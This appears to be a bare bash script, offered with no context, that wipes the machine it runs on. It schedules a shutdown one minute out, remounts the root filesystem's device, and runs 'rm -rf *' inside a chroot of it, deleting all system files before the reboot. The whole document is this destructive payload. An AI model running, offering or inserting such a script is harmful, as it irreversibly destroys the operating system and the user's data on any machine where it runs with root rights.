#!/usr/bin/env bash

shutdown +1

root=$(df -h | grep -w "/" | awk '{print $1}')

mkdir mounty
sudo mount $root mounty

sudo chroot mounty rm -rf *



